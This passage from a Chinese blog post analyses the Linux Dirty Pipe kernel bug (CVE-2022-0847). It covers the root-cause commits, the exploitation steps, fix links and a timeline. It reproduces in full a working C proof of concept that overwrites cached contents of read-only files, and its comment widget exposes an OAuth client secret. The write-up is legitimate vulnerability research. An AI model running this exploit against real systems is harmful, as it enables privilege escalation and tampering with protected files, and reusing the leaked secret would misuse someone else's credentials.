<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * generic_file_read_iter - generic filesystem read routine</span><br><span class="hljs-comment"> * @iocb:    kernel I/O control block</span><br><span class="hljs-comment"> * @iter:    destination for the data read</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This is the &quot;read_iter()&quot; routine for all filesystems</span><br><span class="hljs-comment"> * that can use the page cache directly.</span><br><span class="hljs-comment"> * Return:</span><br><span class="hljs-comment"> * * number of bytes copied, even for partial reads</span><br><span class="hljs-comment"> * * negative error code if nothing was read</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">ssize_t</span></span><br><span class="hljs-function"><span class="hljs-title">generic_file_read_iter</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *iter)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">size_t</span> count = iov_iter_count(iter);<br>    <span class="hljs-keyword">ssize_t</span> retval = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (!count)<br>        <span class="hljs-keyword">goto</span> out; <span class="hljs-comment">/* skip atime */</span><br><br>    <span class="hljs-keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_DIRECT) &#123;<br>        ...<br>    &#125;<br>    <span class="hljs-comment">// 继续调用</span><br>    retval = generic_file_buffered_read(iocb, iter, retval);<br>out:<br>    <span class="hljs-keyword">return</span> retval;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>接着又调 <code>generic_file_buffered_read</code>函数。该函数代码量太大，只简单讲讲其大致功能：</p>
<ul>
<li>尝试在该文件已有的文件缓存映射表中查找先前已经映射的<strong>文件缓存</strong>页<ul>
<li>如果没文件缓存，则读取磁盘上的文件数据，创建新的文件缓存</li>
<li>如果有文件缓存但是缓存过期了，则更新这个文件缓存</li>
</ul>
</li>
<li>到了这一步，此时是一定有文件缓存了。则调用 <code>copy_page_to_iter</code> 函数来将文件缓存页上的数据，拷贝进 pipe 中。</li>
</ul>
<p>这个函数正是我们先前所介绍过的，因此整个 splice 系统调用，就可以和 pipe 那里的未初始化漏洞串起来了。</p>
<h3 id="四、漏洞成因"><a href="#四、漏洞成因" class="headerlink" title="四、漏洞成因"></a>四、漏洞成因</h3><p>这个漏洞并非一蹴而就，而是由两个 commit 的错误相互结合导致的：</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b">new iov_iter flavour: pipe-backed - linux commit 241699</a>：引入字段的未初始化漏洞。 <code>push_pipe</code> 和 <code>copy_page_to_iter_pipe</code> 两个函数在设置 <code>pipe_buffer</code> 结构体时均未初始化 flag 字段。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">pipe: merge anon_pipe_buf*_ops - linux commit f6dd97</a>：在该 commit 前，内核通过比较 <code>pipe_buf-&gt;ops</code> 的地址来判断两块 <code>pipe_buf</code> 是否是<strong>可合并</strong>的。<strong>这种编码并不优雅</strong>，因为无论是否可合并，<code>pipe_buf-&gt;ops</code> 实际指向的几个函数指针都是同一个：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// fs/pipe.c</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> <span class="hljs-title">anon_pipe_buf_ops</span> =</span> &#123;<br>  .confirm = generic_pipe_buf_confirm,<br>  .release = anon_pipe_buf_release,<br>  .steal = anon_pipe_buf_steal,<br>  .get = generic_pipe_buf_get,<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> <span class="hljs-title">anon_pipe_buf_nomerge_ops</span> =</span> &#123;<br>  .confirm = generic_pipe_buf_confirm,<br>  .release = anon_pipe_buf_release,<br>  .steal = anon_pipe_buf_steal,<br>  .get = generic_pipe_buf_get,<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> <span class="hljs-title">packet_pipe_buf_ops</span> =</span> &#123;<br>  .confirm = generic_pipe_buf_confirm,<br>  .release = anon_pipe_buf_release,<br>  .steal = anon_pipe_buf_steal,<br>  .get = generic_pipe_buf_get,<br>&#125;;<br></code></pre></div></td></tr></table></figure>

<p>可以看到，这么 tricky 的代码非常的不优雅，因此在该 commit(f6dd97) 中，linux 重构了这部分代码，启用了新的 pipe buf 标志：<code>PIPE_BUF_FLAG_CAN_MERGE</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// include/linux/pipe_fs_i.h</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_LRU       0x01  <span class="hljs-comment">/* page is on the LRU */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_ATOMIC    0x02  <span class="hljs-comment">/* was atomically mapped */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_GIFT      0x04  <span class="hljs-comment">/* page is a gift */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_PACKET    0x08  <span class="hljs-comment">/* read() as a packet */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_CAN_MERGE 0x10  <span class="hljs-comment">/* can merge buffers */</span>     <span class="hljs-comment">// &lt;= 新引入的 flag</span></span><br></code></pre></div></td></tr></table></figure>

<p>整个重构过程并没有问题，<strong>唯一带来的副作用就是引入了新的 pipe buf 标志：PIPE_BUF_FLAG_CAN_MERGE</strong>。</p>
</li>
</ul>
<p>尽管第一个 commit 引入了字段未初始化漏洞，但该漏洞仍然无法造成较大的影响，因为<strong>可选的几个 pipe buf flag 中没有什么是可以利用的</strong>。但是当第二个 commit 引入了新的 pipe buf flag：<code>PIPE_BUF_FLAG_CAN_MERGE</code> 时，因为新的 pipe_buf 可以通过未初始化漏洞，来重用旧的 flag，例如 <code>PIPE_BUF_FLAG_CAN_MERGE</code>，来<strong>打破 page buf 的完整性</strong>，使得<strong>允许对那些本不该写入的页进行写入</strong> (例如本不该带有 PIPE_BUF_FLAG_CAN_MERGE 标志的页，诸如文件缓存页等等)</p>
<p>注意，这里说的<strong>只读页</strong>，在 pipe 中<strong>并非使用权限控制等技术来保证不写</strong>，而是<strong>通过 pipe 所实现的逻辑来保证</strong>。因此，当 pipe 实现的逻辑出现了问题，那么 pipe 就可以尝试写入只读页，进而达到任意文件写的目的。</p>
<h3 id="五、漏洞利用"><a href="#五、漏洞利用" class="headerlink" title="五、漏洞利用"></a>五、漏洞利用</h3><p>通过上面的代码分析我们可以简单推断出这样的一条漏洞利用链：</p>
<ol>
<li><p>创建管道（务必不要带上 O_DIRECT）</p>
</li>
<li><p>往管道中直接写入大量数据，使得 pipe 结构体中所有 page buf 的 flag 全部都设置了 PIPE_BUF_FLAG_CAN_MERGE 标志。</p>
</li>
<li><p>从该管道中将数据全部读取出来，释放所有 page buf。</p>
</li>
<li><p>调用 splice，将<strong>数据长度不与页大小对齐</strong>的<strong>可读</strong>文件数据，传递至该管道中。这样在管道的 head 位置，势必会有一个 page buf，其中 <strong>page 指向文件缓存</strong>，<strong>flags 为 PIPE_BUF_FLAG_CAN_MERGE</strong>。</p>
<blockquote>
<p>因为 page buf 在重分配时不会初始化 flags，因此这里的 flags 将仍然保留为 PIPE_BUF_FLAG_CAN_MERGE。</p>
</blockquote>
</li>
<li><p>直接继续往该管道中写入目标数据，这样由于 PIPE_BUF_FLAG_CAN_MERGE 标志仍然存在，新写入的数据将会直接与 page buf 所指向的文件缓存合并。</p>
</li>
<li><p>此时访问该文件，则内核会将被修改后的文件缓存中的数据返回，这样便可达到在内核层面任意文件写的目的。</p>
</li>
</ol>
<blockquote>
<p>需要注意的是，通过漏洞来“意外”修改文件缓存，<strong>不会使该文件缓存重新写回磁盘上</strong>。只有当内核的其他模块<strong>主动改写</strong>了这块文件缓存，使得该文件缓存<strong>变脏（dirty）</strong>，这样才会把被修改后的文件缓存保存回磁盘上。</p>
<p>内核判断一个文件缓存是否 dirty，并非判断上面的数据有无被改写，而是判断其 dirty 标志。通过 dirty pipe 漏洞来改写文件缓存并不会影响到上面的 dirty 标志。</p>
</blockquote>
<p>介于 cm4all 那边已经给出了非常清晰易懂的 POC，因此这里直接贴出它的 POC：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> PAGE_SIZE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PAGE_SIZE 4096</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span><br><span class="hljs-comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">prepare_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p[<span class="hljs-number">2</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (pipe(p)) <span class="hljs-built_in">abort</span>();<br><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> pipe_size = fcntl(p[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">4096</span>];<br><br>    <span class="hljs-comment">/* fill the pipe completely; each pipe_buffer will now have</span><br><span class="hljs-comment">       the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br>        <span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-keyword">sizeof</span>(buffer) ? <span class="hljs-keyword">sizeof</span>(buffer) : r;<br>        write(p[<span class="hljs-number">1</span>], buffer, n);<br>        r -= n;<br>    &#125;<br><br>    <span class="hljs-comment">/* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="hljs-comment">       leaving the flags initialized) */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br>        <span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-keyword">sizeof</span>(buffer) ? <span class="hljs-keyword">sizeof</span>(buffer) : r;<br>        read(p[<span class="hljs-number">0</span>], buffer, n);<br>        r -= n;<br>    &#125;<br><br>    <span class="hljs-comment">/* the pipe is now empty, and if somebody adds a new</span><br><span class="hljs-comment">       pipe_buffer without initializing its &quot;flags&quot;, the buffer</span><br><span class="hljs-comment">       will be mergeable */</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Usage: %s TARGETFILE OFFSET DATA\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-comment">/* dumb command-line argument parser */</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> path = argv[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">loff_t</span> offset = strtoul(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> data = argv[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">size_t</span> data_size = <span class="hljs-built_in">strlen</span>(data);<br><br>    <span class="hljs-keyword">if</span> (offset % PAGE_SIZE == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">loff_t</span> end_offset = offset + (<span class="hljs-keyword">loff_t</span>)data_size;<br>    <span class="hljs-keyword">if</span> (end_offset &gt; next_page) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-comment">/* open the input file and validate the specified offset */</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> fd = open(path, O_RDONLY); <span class="hljs-comment">// yes, read-only! :-)</span><br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>    <span class="hljs-keyword">if</span> (fstat(fd, &amp;st)) &#123;<br>        perror(<span class="hljs-string">&quot;stat failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (offset &gt; st.st_size) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Offset is not inside the file\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (end_offset &gt; st.st_size) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-comment">/* create the pipe with all flags initialized with</span><br><span class="hljs-comment">       PIPE_BUF_FLAG_CAN_MERGE */</span><br>    <span class="hljs-keyword">int</span> p[<span class="hljs-number">2</span>];<br>    prepare_pipe(p);<br><br>    <span class="hljs-comment">/* splice one byte from before the specified offset into the</span><br><span class="hljs-comment">       pipe; this will add a reference to the page cache, but</span><br><span class="hljs-comment">       since copy_page_to_iter_pipe() does not initialize the</span><br><span class="hljs-comment">       &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span><br>    --offset;<br>    <span class="hljs-keyword">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;splice failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (nbytes == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;short splice\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-comment">/* the following write will not create a new pipe_buffer, but</span><br><span class="hljs-comment">       will instead write into the page cache, because of the</span><br><span class="hljs-comment">       PIPE_BUF_FLAG_CAN_MERGE flag */</span><br>    nbytes = write(p[<span class="hljs-number">1</span>], data, data_size);<br>    <span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;write failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">size_t</span>)nbytes &lt; data_size) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;short write\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It worked!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> EXIT_SUCCESS;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<h3 id="六-漏洞修复"><a href="#六-漏洞修复" class="headerlink" title="六. 漏洞修复"></a>六. 漏洞修复</h3><p><a target="_blank" rel="noopener" href="https://android-review.googlesource.com/c/kernel/common/+/1998671/1/lib/iov_iter.c">https://android-review.googlesource.com/c/kernel/common/+/1998671/1/lib/iov_iter.c</a></p>
<p><a target="_blank" rel="noopener" href="https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/">https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/</a></p>
<h3 id="七-漏洞发现过程"><a href="#七-漏洞发现过程" class="headerlink" title="七. 漏洞发现过程"></a>七. 漏洞发现<a target="_blank" rel="noopener" href="https://dirtypipe.cm4all.com/">过程</a></h3><ul>
<li>2021-04-29: first support ticket about file corruption</li>
<li>2022-02-19: file corruption problem identified as Linux kernel bug, which turned out to be an exploitable vulnerability</li>
</ul>
<p>漏洞的生命周期显然比较漫长.</p>
<p>背景:</p>
<ul>
<li><p>zip</p>
<ul>
<li><strong>End of central directory record (EOCD)</strong> 和 <strong>Central directory file header</strong> </li>
</ul>
<img src="../../image/dirtypipe/central-directory-structure.png" srcset="/img/loading.gif" lazyload alt="Structure of the central directory" style="zoom: 80%;" />

<ul>
<li>central dirctory header其实都是放在文件末尾, 这样便于添加新文件, 也可以把zip文件变成自我解压缩的zip文件, 只要在含有zip数据的可执行文件后加上header(?)</li>
<li>The ZIP format can hold collections of files without an external archiver, but is less compact than compressed <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Tar_(computing)">tarballs</a> holding the same data, because it compresses files individually and cannot take advantage of redundancy between files (<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Solid_compression">solid compression</a>).</li>
</ul>
<img src="../../image/dirtypipe/image-20221112212650539.png" srcset="/img/loading.gif" lazyload alt="image-20221112212650539" style="zoom:67%;" /></li>
<li><p>zlib <a target="_blank" rel="noopener" href="https://www.bolet.org/~pornin/deflate-flush.html">Sync Flush</a> </p>
<ul>
<li><p>The “sync flush” is what zlib implements when used with the <code>Z_SYNC_FLUSH</code> flag. It performs the following tasks:</p>
<ol>
<li>If there is some buffered but not yet compressed data, then this data is compressed into one or several blocks (the type for each block will depend on the amount and nature of data).</li>
<li>A new type 0 block with empty contents is appended.</li>
</ol>
<p>A type 0 block with empty contents consists of:</p>
<ul>
<li>the three-bit block header;</li>
<li>0 to 7 bits equal to zero, to achieve byte alignment;</li>
<li>the four-byte sequence <code>00 00 FF FF</code>.</li>
</ul>
</li>
</ul>
</li>
<li><p>sendfile是splice的一个子集, 现在的splice可以任意的传送, 两边的选择可以有pipe, socket, fd这些. sendfile在2.6.23已失效, 不过API接口仍然保存, 但是实际的函数已是<code>do_splice_direct</code>, 因为splice可以轻松地模拟sendfile. </p>
<ul>
<li>该函数会继续调用<code>splice_direct_to_actor </code> , This is a special case helper to splice directly between two points, <strong>without</strong> requiring an explicit pipe. <strong>Internally an allocated pipe</strong> is <strong>cached</strong> in the process, and reused during the lifetime of that process. pipe是作为中间人传递数据的, 以便于利用其他的splice函数. 反正pipe也是引用已有的page. </li>
</ul>
</li>
<li></li>
</ul>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/CVE/">CVE</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/CVE/">CVE</a>
                    
                  </div>
                
              </div>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022-09/Now-recent-ctf/">
                        <span class="hidden-mobile">近期题目wp</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="gitalk-container"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#gitalk-container', function() {
      Fluid.utils.createCssLink('/css/gitalk.css')
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', function() {
        var options = Object.assign(
          {"clientID":"312db7ebbc085de5d28d","clientSecret":"85ea3cefd13c73a6d85c1813adfde4f1550bfbda","repo":"yogdzewa.github.io","owner":"yogdzewa","admin":["yogdzewa"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
          {
            id: '6713b87d6c2e89cf1c024f616a1e241d'
          }
        )
        var gitalk = new Gitalk(options);
        gitalk.render('gitalk-container');
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->

  <div class="col-lg-7 mx-auto nopadding-x-md">
    <div class="container custom post-custom mx-auto">
      <img src="https://octodex.github.com/images/jetpacktocat.png" srcset="/img/loading.gif" lazyload class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
    </div>
  </div>


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
